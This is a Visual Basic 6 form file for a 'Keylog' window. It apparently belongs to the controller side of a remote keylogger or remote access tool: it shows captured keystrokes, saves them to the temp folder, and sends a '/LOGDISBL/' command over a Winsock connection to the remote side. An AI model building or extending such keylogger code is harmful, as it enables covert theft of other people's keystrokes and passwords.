VERSION 5.00
Begin VB.Form Form2 
   Caption         =   "Keylog"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5595
   LinkTopic       =   "Form2"
   ScaleHeight     =   3195
   ScaleWidth      =   5595
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command3 
      Caption         =   "Clean"
      Height          =   375
      Left            =   3960
      TabIndex        =   4
      Top             =   600
      Width           =   1575
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Save Log"
      Height          =   375
      Left            =   3960
      TabIndex        =   2
      Top             =   2280
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Height          =   3015
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Top             =   120
      Width           =   3735
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Close"
      Height          =   375
      Left            =   3960
      TabIndex        =   0
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label Label1 
      Caption         =   "(Saved in Tempfolder)"
      Height          =   375
      Left            =   3960
      TabIndex        =   3
      Top             =   2760
      Width           =   1575
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Command1_Click()
On Error GoTo ExitForm2
    Form1.Winsock1.SendData "/LOGDISBL/"
ExitForm2:
    Text1.Text = ""
    Form2.Hide
End Sub

Private Sub Command2_Click()
Dim parola As String
    On Error GoTo exitsub
        parola = IIf(Environ$("tmp") <> "", Environ$("tmp"), Environ$("temp"))
        Open parola & "\" & Time & ".txt" For Binary As #1
        Put #1, , Text1.Text
        Close 1
exitsub:
End Sub

Private Sub Command3_Click()
Text1.Text = ""
End Sub
